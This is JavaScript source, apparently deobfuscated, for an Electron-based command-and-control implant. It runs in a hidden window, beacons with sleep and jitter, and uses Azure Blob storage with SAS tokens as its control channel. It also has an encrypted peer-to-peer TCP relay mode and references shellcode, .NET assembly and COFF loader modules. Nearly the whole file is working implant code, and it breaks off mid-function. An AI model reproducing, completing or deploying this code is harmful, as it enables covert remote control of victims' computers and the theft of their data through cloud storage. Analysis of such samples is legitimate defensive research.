//Wed Oct 22 2025 16:02:58 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
const {
  app,
  BrowserWindow,
  ipcMain
} = require("electron");
const crypto = require("crypto");
const {
  log
} = require("console");
const os = require("os");
const fsp = require("fs").promises;
const {
  spawn
} = require("child_process");
const path = require("path");
const dns = require("dns");
const net = require("net");
let customDnsServer = null;
const config = require("./config.js");
global.mode = !config.mode || config.mode !== "egress" && !config.mode.startsWith("link-") ? "egress" : config.mode;
global.TCPServer = null;
global.TCPLinkAgent = null;
global.init = false;
global.debug = true;
global.mainWindow = null;
global.agent = null;
global.scexecNodePath = "./scexec.node";
global.assemblyNodePath = "./assembly.node";
global.path_coffloader = "./COFFLoader.node";
global.STORAGE_ACCOUNT = config.storageAccount;
global.META_CONTAINER = config.metaContainer;
global.SAS_TOKEN = config.sasToken;
global.P2P_CHALLENGE = config.metaContainer;
global.P2P_PORT = config.p2pPort || null;
global.flag = config.flag;
class Container {
  constructor() {
    this.name = generateUUID(10);
    this.key = generateAESKey();
    this.blobs = {
      checkin: "c-" + generateUUID(12),
      in: "i-" + generateUUID(12)
    };
  }
  setName(_0x34d49d) {
    this.name = _0x34d49d;
  }
  setKey(_0xcd4f98) {
    this.key = {
      key: _0xcd4f98.key,
      iv: _0xcd4f98.iv
    };
  }
}
class Agent {
  constructor() {
    this.agentid = generateUUID(16);
    this.container = new Container();
    this.checkin = Date.now();
    this.sleepinterval = 5;
    this.sleepjitter = 15;
    this.thissleep = 5000;
    this.storageAccount = "";
    this.metaContainer = "";
    this.sasToken = "";
    this.cwd = "";
  }
  setAgentId(_0x28fc2d) {
    this.agentid = _0x28fc2d;
  }
  setContainer(_0x5b8fec) {
    this.container = _0x5b8fec;
  }
  setStorageConfig(_0xc9b0e3, _0x3b78bb, _0x4875e9) {
    this.storageAccount = _0xc9b0e3;
    this.metaContainer = _0x3b78bb;
    this.sasToken = _0x4875e9;
  }
  setCwd(_0x3887e6) {
    this.cwd = _0x3887e6;
  }
  setWindow(_0x3093fd) {
    this.window = _0x3093fd;
  }
}
class Task {
  constructor(_0x475aa1, _0x42feae, _0x102ad6 = null, _0x2092fc = null) {
    this.outputChannel = _0x475aa1;
    this.command = _0x42feae;
    this.uploadChannel = _0x102ad6;
    this.taskid = _0x2092fc;
  }
}
function debug(_0x1cd8a9) {
  if (global.debug) {
    const _0x331638 = new Date().toISOString();
    log("[" + _0x331638 + "] " + _0x1cd8a9);
  }
}
async function createWindow() {
  let _0x112639 = new BrowserWindow({
    width: 0,
    height: 0,
    show: false,
    skipTaskbar: true,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      backgroundThrottling: false,
      v8CacheOptions: "none"
    }
  });
  _0x112639.loadFile("renderer.html");
  debug("Window created");
  return _0x112639;
}
app.on("window-all-closed", () => {});
app.on("ready", async () => {
  try {
    debug("App is ready, creating main window...");
    global.mainWindow = await createWindow();
    if (!global.mainWindow) {
      throw new Error("Failed to create main window");
    }
    global.agent = new Agent();
    global.agent.setStorageConfig(global.STORAGE_ACCOUNT, global.META_CONTAINER, global.SAS_TOKEN);
    global.agent.setCwd(process.cwd());
    debug("[READY] Storage config:");
    debug("[READY] |_ storageAccount: " + global.agent.storageAccount);
    debug("[READY] |_ metaContainer: " + global.agent.metaContainer);
    debug("[READY] |_ sasToken: " + global.agent.sasToken);
    debug("[READY] Agent object properties:");
    debug("[READY] |_ agentid: " + global.agent.agentid);
    debug("[READY] |_ checkin: " + global.agent.checkin);
    debug("[READY] |_ sleepinterval: " + global.agent.sleepinterval);
    debug("[READY] |_ sleepjitter: " + global.agent.sleepjitter);
    debug("[READY] |_ thissleep: " + global.agent.thissleep);
    debug("[READY] |_ cwd: " + global.agent.cwd);
    debug("[READY] Container object:");
    debug("\t" + JSON.stringify(global.agent.container));
    let _0x2708c9 = 0;
    if (global.mode == "link-tcp") {
      debug("Starting TCP server on port " + global.P2P_PORT + "...");
      global.TCPServer = new TCPServer(global.P2P_PORT, global.P2P_CHALLENGE, global.agent.agentid);
      try {
        await global.TCPServer.start();
        debug("TCP server started successfully on port " + global.P2P_PORT);
        debug("Waiting for client to connect and authenticate...");
        await global.TCPServer.waitForClient();
        debug("Client connected and authenticated successfully");
      } catch (_0x536ff6) {
        debug("Failed to start TCP server or wait for client: " + _0x536ff6.message + "\r\n" + _0x536ff6.stack);
        return;
      }
    }
    while (true) {
      let _0x602361 = await init();
      if (_0x602361 === true) {
        debug("Initialization successful");
        break;
      } else {
        _0x2708c9++;
        debug("Initialization failed for " + _0x2708c9 + " time, retrying in 20 seconds... ");
        await new Promise(_0x556ac1 => setTimeout(_0x556ac1, 20000));
      }
    }
    await TaskLoop();
  } catch (_0xa76305) {
    debug("Error during initialization: " + _0xa76305.message);
    debug("Error stack: " + _0xa76305.stack);
    app.quit();
  }
});
class TCPAgent {
  constructor(_0x526cd3 = {}) {
    this.config = {
      hostname: _0x526cd3.hostname,
      port: _0x526cd3.port,
      password: _0x526cd3.password,
      maxReconnectDelay: 30000,
      initialReconnectDelay: 1000,
      requestTimeout: 30000
    };
    this.client = null;
    this.isConnected = false;
    this.reconnectAttempts = 0;
    this.buffer = "";
    this.p2p_aes = null;
    this.onMessageCallback = null;
    this.onConnectCallback = null;
    this.onDisconnectCallback = null;
    this.onErrorCallback = null;
  }
  async generateKeyAndIV(_0x179a94) {
    const _0x310de5 = "fixed-salt";
    const _0x4d13cf = crypto.pbkdf2Sync(_0x179a94, _0x310de5, 100000, 32, "sha256");
    const _0x3d930f = crypto.pbkdf2Sync(_0x179a94, _0x310de5 + "iv", 100000, 16, "sha256").slice(0, 16);
    return {
      key: _0x4d13cf,
      iv: _0x3d930f
    };
  }
  async encrypt(_0x1008d8, _0x25c31e, _0x8b08a6) {
    const _0x31e99b = crypto.createCipheriv("aes-256-cbc", _0x25c31e, _0x8b08a6);
    let _0x16cb5e = "";
    Buffer.isBuffer(_0x1008d8) ? _0x16cb5e = Buffer.concat([_0x31e99b.update(_0x1008d8), _0x31e99b.final()]) : (_0x16cb5e = _0x31e99b.update(_0x1008d8, "utf8", "hex"), _0x16cb5e += _0x31e99b.final("hex"));
    return _0x16cb5e;
  }
  async decrypt(_0x5aeedb, _0x3b0b3e, _0x43de84) {
    try {
      const _0x1b335c = crypto.createDecipheriv("aes-256-cbc", _0x3b0b3e, _0x43de84);
      let _0x2be7fc = "";
      Buffer.isBuffer(_0x5aeedb) ? _0x2be7fc = Buffer.concat([_0x1b335c.update(_0x5aeedb), _0x1b335c.final()]) : (_0x2be7fc = _0x1b335c.update(_0x5aeedb, "hex", "utf8"), _0x2be7fc += _0x1b335c.final("utf8"));
      return _0x2be7fc;
    } catch (_0x4ac655) {
      debug("Error in decrypt(): " + _0x4ac655 + " " + _0x4ac655.stack);
      return null;
    }
  }
  async base64Encode(_0x34b107) {
    try {
      if (typeof _0x34b107 === "string") {
        _0x34b107 = Buffer.from(_0x34b107, "utf-8");
      } else {
        !Buffer.isBuffer(_0x34b107) && (_0x34b107 = Buffer.from(JSON.stringify(_0x34b107), "utf-8"));
      }
      return _0x34b107.toString("base64");
    } catch (_0x5df8e7) {
      return null;
    }
  }
  async base64Decode(_0x40c70a) {
    try {
      const _0x36bb34 = Buffer.from(_0x40c70a, "base64");
      return _0x36bb34.toString("utf-8");
    } catch (_0x4a031c) {
      return null;
    }
  }
  async connect() {
    if (!this.config.hostname || !this.config.port || !this.config.password) {
      throw new Error("Missing required parameters: hostname, port, and password are required");
    }
    this.client = new net.Socket();
    this.client.connect(this.config.port, this.config.hostname, async () => {
      debug("Connected to server");
      this.isConnected = true;
      this.reconnectAttempts = 0;
      this.p2p_aes = await this.generateKeyAndIV(this.config.password);
      const _0xffa228 = await this.encrypt(this.config.password, this.p2p_aes.key, this.p2p_aes.iv);
      const _0x50c10a = await this.base64Encode(_0xffa228);
      this.client.write(_0x50c10a + "\n");
      this.onConnectCallback && this.onConnectCallback();
    });
    this.setupEventHandlers();
  }
  setupEventHandlers() {
    this.client.on("data", async _0x212d8a => {
      const _0x20ef8b = await this.base64Decode(_0x212d8a.toString());
      const _0x44649d = await this.decrypt(_0x20ef8b, this.p2p_aes.key, this.p2p_aes.iv);
      this.buffer += _0x44649d;
      const _0x26b561 = this.buffer.split("\n");
      this.buffer = _0x26b561.pop();
      for (const _0x4b1140 of _0x26b561) {
        if (!_0x4b1140.trim()) {
          continue;
        }
        if (_0x4b1140.trim() === "AUTH_SUCCESS") {
          debug("Authentication successful");
          continue;
        } else {
          if (_0x4b1140.trim() === "AUTH_FAILED") {
            debug("Authentication failed");
            this.disconnect();
            return;
          }
        }
        try {
          const _0x1bbf79 = JSON.parse(_0x4b1140);
          if (_0x1bbf79.headers && _0x1bbf79.headers["x-ms-meta-link"]) {
            const _0x4355b0 = _0x1bbf79.headers["x-ms-meta-link"];
            _0x1bbf79.headers["x-ms-meta-link"] = _0x4355b0 ? _0x4355b0 + "," + global.agent.agentid : global.agent.agentid;
          }
          debug("Received web request from server:");
          debug("Task ID: " + _0x1bbf79.taskId);
          debug("Agent ID: " + _0x1bbf79.agentId);
          debug("URL: " + _0x1bbf79.url);
          debug("Method: " + _0x1bbf79.method);
          debug("Headers: " + JSON.stringify(_0x1bbf79.headers));
          debug("Body: " + _0x1bbf79.body);
          if (!_0x1bbf79.url) {
            throw new Error("Missing required field: url");
          }
          const _0x4200a9 = _0x1bbf79.method || "GET";
          const _0x286ae6 = _0x1bbf79.headers || {};
          const _0x5628af = {
            "Cache-Control": "no-cache, no-store, must-revalidate",
            Pragma: "no-cache",
            Expires: "0"
          };
          const _0x586845 = new URL(_0x1bbf79.url);
          const _0x318cac = _0x586845.hostname;
          const _0x33269d = _0x586845.pathname + _0x586845.search;
          let _0x143caa = {
            hostname: _0x318cac,
            path: _0x33269d,
            port: 80,
            method: _0x4200a9,
            headers: {
              ..._0x5628af,
              ..._0x286ae6
            },
            signal: AbortSignal.timeout(this.config.requestTimeout)
          };
          _0x1bbf79.body !== undefined && !["GET", "HEAD"].includes(_0x4200a9.toUpperCase()) && (_0x4200a9 === "PUT" && _0x286ae6["Content-Type"] === "text/plain" ? _0x143caa.body = _0x1bbf79.body : _0x143caa.body = _0x1bbf79.body);
          debug("Sending request with options:", JSON.stringify(_0x143caa, null, 2));
          try {
            const _0x52f22a = await func_Web_Request(_0x143caa, _0x143caa.body, _0x1bbf79.isBytes);
            debug("Response status: " + _0x52f22a.status + " " + _0x52f22a.statusText);
            let _0x295a4e = "";
            if (_0x1bbf79.isBytes) {
              const _0x1f74cf = await _0x52f22a.data.arrayBuffer();
              _0x295a4e = Buffer.from(_0x1f74cf);
            } else {
              _0x295a4e = await _0x52f22a.data;
            }
            const _0x6feace = {
              status: _0x52f22a.status,
              statusText: _0x52f22a.statusText,
              headers: _0x52f22a.headers,
              data: _0x295a4e,
              agentId: _0x1bbf79.agentId,
              taskId: _0x1bbf79.taskId
            };
            debug("Response object: " + JSON.stringify(_0x6feace));
            const _0x42116b = await this.encrypt(JSON.stringify(_0x6feace) + "\n", this.p2p_aes.key, this.p2p_aes.iv);
            const _0x524c3e = await this.base64Encode(_0x42116b);
            this.client.write(_0x524c3e);
            debug("Sent response back to server");
          } catch (_0x52839a) {
            debug("Fetch error:", _0x52839a);
            if (_0x52839a.name === "AbortError") {
              throw new Error("Request timed out after " + this.config.requestTimeout + " seconds");
            }
            throw _0x52839a;
          }
        } catch (_0x41d567) {
          debug("Error processing request:", _0x41d567);
          const _0x1c6341 = {
            error: _0x41d567.message,
            agentId: currentRequest?.["agentId"],
            taskId: currentRequest?.["taskId"]
          };
          try {
            const _0x4b0006 = await this.encrypt(JSON.stringify(_0x1c6341) + "\n", this.p2p_aes.key, this.p2p_aes.iv);
            const _0x2e6ac6 = await this.base64Encode(_0x4b0006);
            this.client.write(_0x2e6ac6);
            debug("Sent error response to server");
          } catch (_0x3edce4) {
            debug("Failed to encrypt error response:", _0x3edce4);
          }
        }
      }
    });
    this.client.on("end", () => {
      debug("Connection ended");
      this.isConnected = false;
      this.onDisconnectCallback && this.onDisconnectCallback();
    });
    this.client.on("error", _0x39b789 => {
      debug("Connection error:", _0x39b789);
      this.isConnected = false;
      this.onErrorCallback && this.onErrorCallback(_0x39b789);
    });
  }
  async sendMessage(_0x2bab2a) {
    if (!this.isConnected) {
      throw new Error("Not connected to server");
    }
    try {
      const _0x393bd1 = await this.encrypt(JSON.stringify(_0x2bab2a) + "\n", this.p2p_aes.key, this.p2p_aes.iv);
      const _0xa304f0 = await this.base64Encode(_0x393bd1);
      this.client.write(_0xa304f0);
      return true;
    } catch (_0x464253) {
      debug("Error sending message:", _0x464253);
      return false;
    }
  }
  disconnect() {
    this.client && (this.client.destroy(), this.isConnected = false);
  }
  attemptReconnect() {
    if (this.isConnected) {
      return;
    }
    const _0x37f1fe = Math.min(this.config.initialReconnectDelay * Math.pow(2, this.reconnectAttempts), this.config.maxReconnectDelay);
    debug("Attempting to reconnect in " + _0x37f1fe + "ms...");
    setTimeout(() => {
      this.reconnectAttempts++;
      this.connect();
    }, _0x37f1fe);
  }
}
class TCPServer {
  constructor(_0x4ab60f, _0x2652bb, _0x477231) {
    this.server = null;
    this.authenticatedClients = new Set();
    this.requestQueue = [];
    this.isProcessingQueue = false;
    this.clientConnectedPromise = null;
    this.clientConnectedResolve = null;
    this.pendingResponses = new Map();
    this.port = _0x4ab60f;
    this.password = _0x2652bb;
    this.agentId = _0x477231;
  }
  async start() {
    return new Promise((_0x5b9ebe, _0x363b59) => {
      this.server = net.createServer(_0x2981c1 => {
        let _0x2e61bd = false;
        let _0x8c1da6 = "";
        _0x2981c1.on("data", async _0x353fe7 => {
          _0x8c1da6 = "";
          const _0x2bfa93 = _0x353fe7.toString();
          global.p2p_aes = await generateKeyAndIV(this.password);
          try {
            const _0x39907a = await func_Base64_Decode(_0x2bfa93);
            if (!_0x39907a) {
              debug("[TCP-SERVER] Failed to decode base64 message");
              _0x2981c1.end();
              return;
            }
            _0x8c1da6 = await func_Decrypt(_0x39907a, global.p2p_aes.key, global.p2p_aes.iv);
            _0x8c1da6 = _0x8c1da6;
            if (!_0x8c1da6) {
              debug("[TCP-SERVER] Failed to decrypt message");
              _0x2981c1.end();
              return;
            }
          } catch (_0x541c96) {
            debug("[TCP-SERVER] Error processing message: " + _0x541c96.message);
            _0x2981c1.end();
            return;
          }
          debug("[TCP-SERVER] Received message: " + _0x8c1da6);
          if (!_0x2e61bd) {
            if (_0x8c1da6 === this.password) {
              debug("[TCP-SERVER] Authentication successful");
              _0x2e61bd = true;
              this.authenticatedClients.add(_0x2981c1);
              let _0x17affc = await func_Encrypt("AUTH_SUCCESS\n", global.p2p_aes.key, global.p2p_aes.iv);
              let _0x5e6662 = await func_Base64_Encode(_0x17affc);
              _0x2981c1.write(_0x5e6662);
              this.clientConnectedResolve && (this.clientConnectedResolve(), this.clientConnectedResolve = null, this.clientConnectedPromise = null);
            } else {
              debug("[TCP-SERVER] Authentication failed - invalid password");
              let _0x92df85 = await func_Encrypt("AUTH_FAILED\n", global.p2p_aes.key, global.p2p_aes.iv);
              let _0x42110a = await func_Base64_Encode(_0x92df85);
              _0x2981c1.write(_0x42110a);
              _0x2981c1.end();
            }
            return;
          }
          try {
            const _0x2f157a = JSON.parse(_0x8c1da6);
            debug("[TCP-SERVER] Response with taskId: " + _0x2f157a.taskId);
            debug("[TCP-SERVER] Response with agentid: " + _0x2f157a.agentId);
            const _0x184317 = this.pendingResponses.get(_0x2f157a.taskId);
            _0x184317 && (_0x184317.resolve(_0x2f157a), this.pendingResponses.delete(_0x2f157a.taskId));
            this.requestQueue.length > 0 && this.requestQueue.shift();
            this.processNextRequest();
          } catch (_0x2e0436) {
            debug("[TCP-SERVER] Error parsing response: " + _0x2e0436.message);
            if (this.requestQueue.length > 0) {
              const _0xc82f96 = this.requestQueue[0];
              _0xc82f96.reject(_0x2e0436);
              this.requestQueue.shift();
            }
          }
        });
        _0x2981c1.on("end", () => {
          debug("[TCP-SERVER] Client disconnected (end event)");
          if (_0x2e61bd) {
            for (const [_0x380042, _0x5dfbe9] of this.pendingResponses) {
              _0x5dfbe9.reject(new Error("Client disconnected"));
              this.pendingResponses.delete(_0x380042);
            }
            this.authenticatedClients.delete(_0x2981c1);
            debug("[TCP-SERVER] Removed client from authenticated clients. Remaining clients: " + this.authenticatedClients.size);
            this.authenticatedClients.size === 0 && (this.clientConnectedPromise = null, this.clientConnectedResolve = null);
          }
        });
        _0x2981c1.on("error", _0x51f0c6 => {
          debug("[TCP-SERVER] Client connection error: " + _0x51f0c6.message);
          if (_0x2e61bd) {
            for (const [_0x5965ef, _0x31850f] of this.pendingResponses) {
              _0x31850f.reject(new Error("Client connection error"));
              this.pendingResponses.delete(_0x5965ef);
            }
            this.authenticatedClients.delete(_0x2981c1);
            debug("[TCP-SERVER] Removed client from authenticated clients due to error. Remaining clients: " + this.authenticatedClients.size);
          }
        });
        _0x2981c1.setTimeout(30000);
        _0x2981c1.on("timeout", () => {
          debug("[TCP-SERVER] Client connection timed out");
          if (_0x2e61bd) {
            for (const [_0x51a097, _0x281952] of this.pendingResponses) {
              _0x281952.reject(new Error("Client connection timeout"));
              this.pendingResponses.delete(_0x51a097);
            }
            this.authenticatedClients.delete(_0x2981c1);
            debug("[TCP-SERVER] Removed client from authenticated clients due to timeout. Remaining clients: " + this.authenticatedClients.size);
          }
          TaskLoop();
        });
      });
      this.server.listen(this.port, () => {
        _0x5b9ebe();
      });
      this.server.on("error", _0x5eff1a => {
        _0x363b59(_0x5eff1a);
      });
    });
  }
  waitForClient() {
    if (this.authenticatedClients.size > 0) {
      return Promise.resolve();
    }
    this.clientConnectedPromise = null;
    this.clientConnectedResolve = null;
    this.clientConnectedPromise = new Promise(_0x38c7d4 => {
      this.clientConnectedResolve = _0x38c7d4;
    });
    return this.clientConnectedPromise;
  }
  stop() {
    return new Promise(_0x3c36da => {
      this.server ? this.server.close(() => {
        _0x3c36da();
      }) : _0x3c36da();
    });
  }
  generateTaskId() {
    return crypto.randomBytes(4).toString("hex");
  }
  async processNextRequest() {
    if (this.requestQueue.length === 0) {
      this.isProcessingQueue = false;
      return;
    }
    const _0x3e59f2 = this.requestQueue[0];
    const _0x29c6fc = this.getNextAuthenticatedClient();
    if (!_0x29c6fc) {
      while (this.requestQueue.length > 0) {
        const _0x5d3226 = this.requestQueue.shift();
        _0x5d3226.reject(new Error("No authenticated clients available"));
      }
      this.isProcessingQueue = false;
      return;
    }
    const _0x227215 = this.generateTaskId();
    const _0x105b03 = {
      ..._0x3e59f2,
      taskId: _0x227215,
      agentId: this.agentId
    };
    this.pendingResponses.set(_0x227215, {
      resolve: _0x3e59f2.resolve,
      reject: _0x3e59f2.reject
    });
    let _0x1c75ba = JSON.stringify(_0x105b03) + "\n";
    let _0x4538c5 = await func_Encrypt(_0x1c75ba, global.p2p_aes.key, global.p2p_aes.iv);
    let _0x524a7f = await func_Base64_Encode(_0x4538c5);
    _0x29c6fc.write(_0x524a7f);
  }
  getNextAuthenticatedClient() {
    return this.authenticatedClients.size > 0 ? Array.from(this.authenticatedClients)[0] : null;
  }
  async makeWebRequest(_0x2a3f29) {
    return new Promise((_0x5d72cb, _0x2702b9) => {
      if (this.authenticatedClients.size === 0) {
        debug("[TCP-SERVER] No authenticated clients available");
        _0x5d72cb(false);
        return;
      }
      const _0x2f691f = {
        ..._0x2a3f29,
        resolve: _0x5d72cb,
        reject: _0x2702b9
      };
      this.requestQueue.push(_0x2f691f);
      !this.isProcessingQueue && (this.isProcessingQueue = true, this.processNextRequest());
    });
  }
}
function generateAESKey() {
  const _0x5dde88 = {
    key: crypto.randomBytes(32),
    iv: crypto.randomBytes(16)
  };
  return _0x5dde88;
}
async function generateKeyAndIV(_0x1bbd7a) {
  const _0xbdb383 = "fixed-salt";
  const _0x4a8762 = crypto.pbkdf2Sync(_0x1bbd7a, _0xbdb383, 100000, 32, "sha256");
  const _0x23b227 = crypto.pbkdf2Sync(_0x1bbd7a, _0xbdb383 + "iv", 100000, 16, "sha256").slice(0, 16);
  return {
    key: _0x4a8762,
    iv: _0x23b227
  };
}
function generateUUID(_0x3bab37) {
  if (_0x3bab37 > 20) {
    _0x3bab37 = 20;
  }
  if (_0x3bab37 < 1) {
    return "";
  }
  const _0xa1ef52 = "abcdefghijklmnopqrstuvwxyz";
  const _0x252b1c = _0xa1ef52[Math.floor(Math.random() * _0xa1ef52.length)];
  if (_0x3bab37 === 1) {
    return _0x252b1c;
  }
  const _0x246d41 = crypto.randomBytes(Math.ceil((_0x3bab37 - 1) / 2)).toString("hex");
  return (_0x252b1c + _0x246d41).substring(0, _0x3bab37);
}
async function func_Encrypt(_0x2b08cd, _0x3fb848, _0x3827ac) {
  const _0x280638 = crypto.createCipheriv("aes-256-cbc", _0x3fb848, _0x3827ac);
  let _0x4053c9 = "";
  Buffer.isBuffer(_0x2b08cd) ? _0x4053c9 = Buffer.concat([_0x280638.update(_0x2b08cd), _0x280638.final()]) : (_0x4053c9 = _0x280638.update(_0x2b08cd, "utf8", "hex"), _0x4053c9 += _0x280638.final("hex"));
  return _0x4053c9;
}
async function func_Decrypt(_0x5ff54c, _0xeddaaa, _0x489cc1) {
  try {
    const _0x50155 = crypto.createDecipheriv("aes-256-cbc", _0xeddaaa, _0x489cc1);
    let _0x1fe52d = "";
    Buffer.isBuffer(_0x5ff54c) ? _0x1fe52d = Buffer.concat([_0x50155.update(_0x5ff54c), _0x50155.final()]) : (_0x1fe52d = _0x50155.update(_0x5ff54c, "hex", "utf8"), _0x1fe52d += _0x50155.final("utf8"));
    return _0x1fe52d;
  } catch (_0x3edc2b) {
    debug("Error in func_Decrypt() : " + _0x3edc2b + " " + _0x3edc2b.stack);
    return null;
  }
}
async function func_Base64_Encode(_0x166f0) {
  try {
    if (typeof _0x166f0 === "string") {
      _0x166f0 = Buffer.from(_0x166f0, "utf-8");
    } else {
      !Buffer.isBuffer(_0x166f0) && (_0x166f0 = Buffer.from(JSON.stringify(_0x166f0), "utf-8"));
    }
    return _0x166f0.toString("base64");
  } catch (_0x53f960) {
    return null;
  }
}
async function func_Base64_Decode(_0x27227d) {
  try {
    const _0x59b9f9 = Buffer.from(_0x27227d, "base64");
    return _0x59b9f9.toString("utf-8");
  } catch (_0x5c8485) {
    return null;
  }
}
async function func_Web_Request(_0x4bdf9f, _0x1deb7b = null, _0x48a01a = false) {
  (!global.mainWindow || global.mainWindow.isDestroyed()) && (debug("Main window is not available"), global.mainWindow = await createWindow());
  global.mainWindow.webContents.isLoading() && (await new Promise(_0x5c7150 => {
    global.mainWindow.webContents.once("did-finish-load", _0x5c7150);
  }));
  const _0xf43e9c = "http://" + _0x4bdf9f.hostname + _0x4bdf9f.path;
  const _0x3c006b = Date.now().toString();
  _0x1deb7b && (!_0x4bdf9f.headers && (_0x4bdf9f.headers = {}), _0x4bdf9f.headers["Content-Length"] = Buffer.byteLength(_0x1deb7b));
  const _0x15d5fc = {
    url: _0xf43e9c,
    method: _0x4bdf9f.method,
    headers: _0x4bdf9f.headers,
    body: _0x1deb7b,
    isBytes: _0x48a01a
  };
  if (global.mode == "link-tcp") {
    _0x15d5fc.requestId = _0x3c006b;
    _0x15d5fc.isBytes = _0x48a01a;
    const _0x504f2d = await global.TCPServer.makeWebRequest(_0x15d5fc);
    debug("[WEB-REQUEST] Response : " + JSON.stringify(_0x504f2d));
    return _0x504f2d;
  }
  return new Promise((_0x157d17, _0x39a142) => {
    const _0x403505 = (_0x5dc9f1, _0x19df09) => {
      debug("[WEB-REQUEST] Response status: " + _0x19df09.status);
      if (_0x19df09.error) {
        _0x39a142(new Error(_0x19df09.error));
        return;
      }
      _0x157d17({
        response: _0x19df09,
        status: _0x19df09.status,
        data: _0x19df09.data
      });
    };
    ipcMain.once("web-request-response-" + _0x3c006b, _0x403505);
    _0x1deb7b && (!_0x4bdf9f.headers && (_0x4bdf9f.headers = {}), _0x4bdf9f.headers["Content-Length"] = Buffer.byteLength(_0x1deb7b));
    try {
      global.mainWindow.webContents.send("make-web-request", {
        url: _0xf43e9c,
        method: _0x4bdf9f.method,
        headers: _0x4bdf9f.headers,
        body: _0x1deb7b,
        requestId: _0x3c006b,
        isBytes: _0x48a01a
      });
    } catch (_0x2222df) {
      ipcMain.removeListener("web-request-response-" + _0x3c006b, _0x403505);
      _0x39a142(_0x2222df);
    }
    let _0x410f11 = _0x4bdf9f.path.includes("restype=container") ? 60000 : 30000;
    _0x48a01a && (_0x410f11 = 300000);
    setTimeout(() => {
      ipcMain.removeListener("web-request-response-" + _0x3c006b, _0x403505);
      _0x39a142(new Error("Web request timed out after " + _0x410f11 + "ms"));
    }, _0x410f11);
  });
}
async function func_Blob_Stat(_0x226cf4, _0x2500bd) {
  let _0x41a0ac = {
    hostname: global.agent.storageAccount,
    port: 80,
    path: "/" + _0x226cf4 + "/" + _0x2500bd + "?restype=blob&" + global.agent.sasToken,
    method: "HEAD",
    headers: {
      "x-ms-version": "2020-02-10",
      "x-ms-date": new Date().toUTCString()
    }
  };
  let _0x521168 = await func_Web_Request(_0x41a0ac);
  return _0x521168.status === 200;
}
async function func_Blob_Create(_0xcbf725, _0x505b97, _0x587fd2) {
  try {
    debug("[BLOB_CREATE] blob : /" + _0xcbf725 + "/" + _0x505b97);
    _0x587fd2 == null && (_0x587fd2 = "");
    _0x587fd2 = _0x587fd2.toString();
    const _0x455429 = {
      hostname: global.agent.storageAccount,
      port: 80,
      path: "/" + _0xcbf725 + "/" + _0x505b97 + "?" + global.agent.sasToken,
      method: "PUT",
      headers: {
        "x-ms-version": "2020-02-10",
        "x-ms-date": new Date().toUTCString(),
        "x-ms-blob-type": "BlockBlob",
        "Content-Type": "text/plain",
        "Content-Length": Buffer.byteLength(_0x587fd2)
      }
    };
    let _0x25eabf = await func_Web_Request(_0x455429, _0x587fd2);
    return _0x25eabf.status === 201;
  } catch (_0x5be20b) {
    debug("Error in func_Blob_Create() : " + _0x5be20b);
    return false;
  }
}
async function clearBlob(_0x17963a, _0x33f8ff) {
  const _0x479154 = {
    hostname: global.agent.storageAccount,
    port: 80,
    path: "/" + _0x17963a + "/" + _0x33f8ff + "?" + global.agent.sasToken,
    method: "PUT",
    headers: {
      "x-ms-version": "2020-02-10",
      "x-ms-date": new Date().toUTCString(),
      "x-ms-blob-type": "BlockBlob",
      "Content-Type": "text/plain",
      "Content-Length": 0
    }
  };
  return await func_Web_Request(_0x479154);
}
async function func_Container_Create(_0x1d952b) {
  debug("[CONTAINER_CREATE] container : " + _0x1d952b);
  let _0x4478c0 = await func_Container_Stat(_0x1d952b);
  if (_0x4478c0 === false) {
    let _0x35566f = {
      hostname: global.agent.storageAccount,
      port: 80,
      path: "/" + _0x1d952b + "?restype=container&" + global.agent.sasToken,
      method: "PUT",
      headers: {
        "x-ms-version": "2020-02-10",
        "x-ms-date": new Date().toUTCString(),
        "Content-Length": 0
      }
    };
    let _0x2e243b = await func_Web_Request(_0x35566f);
    return _0x2e243b.status === 201;
  }
  return _0x4478c0;
}
async function func_Container_Stat(_0x3b620a) {
  let _0x5e623a = {
    hostname: global.agent.storageAccount,
    port: 80,
    path: "/" + _0x3b620a + "?restype=container&" + global.agent.sasToken,
    method: "HEAD",
    headers: {
      "x-ms-version": "2020-02-10",
      "x-ms-date": new Date().toUTCString()
    }
  };
  let _0x277af5 = await func_Web_Request(_0x5e623a);
  return _0x277af5.status === 200;
}
async function Blob_Set_Metadata(_0x3e9cae, _0x178226, _0x20af23) {
  const _0x28ca40 = "/" + _0x3e9cae + "/" + _0x178226 + "?comp=metadata&" + global.agent.sasToken;
  const _0xdc1a4a = {
    "x-ms-version": "2022-11-02",
    "x-ms-date": new Date().toUTCString(),
    "Content-Length": 0
  };
  for (const [_0x20e517, _0x1f4ded] of Object.entries(_0x20af23)) {
    _0xdc1a4a["x-ms-meta-" + _0x20e517.toLowerCase()] = _0x1f4ded;
  }
  const _0x1777a5 = {
    method: "PUT",
    hostname: global.agent.storageAccount,
    path: _0x28ca40,
    port: 80,
    headers: _0xdc1a4a
  };
  return await func_Web_Request(_0x1777a5);
}
async function getSystemInfo() {
  try {
    (!global.mainWindow || global.mainWindow.isDestroyed()) && (debug("Main window is not available"), global.mainWindow = await createWindow());
    global.mainWindow.webContents.isLoading() && (await new Promise(_0x17ddd3 => {
      global.mainWindow.webContents.once("did-finish-load", _0x17ddd3);
    }));
    return new Promise((_0x2bf468, _0x20b633) => {
      const _0x4cee4f = Date.now().toString();
      const _0x4069dd = (_0x25b29f, _0x153aaf) => {
        ipcMain.removeListener("system-info-response-" + _0x4cee4f, _0x4069dd);
        _0x2bf468(_0x153aaf);
      };
      ipcMain.once("system-info-response-" + _0x4cee4f, _0x4069dd);
      global.mainWindow.webContents.send("get-system-info", _0x4cee4f, global.mode);
      setTimeout(() => {
        ipcMain.removeListener("system-info-response-" + _0x4cee4f, _0x4069dd);
        _0x20b633(new Error("System info request timed out"));
      }, 5000);
    });
  } catch (_0x3eae13) {
    debug("Error getting system info: " + _0x3eae13 + " " + _0x3eae13.stack);
    return 0;
  }
}
async function func_Blob_Write(_0x5ca5aa, _0x42d142) {
  try {
    _0x42d142 == null && (_0x42d142 = "");
    _0x42d142 = _0x42d142.toString();
    const _0x4925aa = {
      hostname: global.agent.storageAccount,
      port: 80,
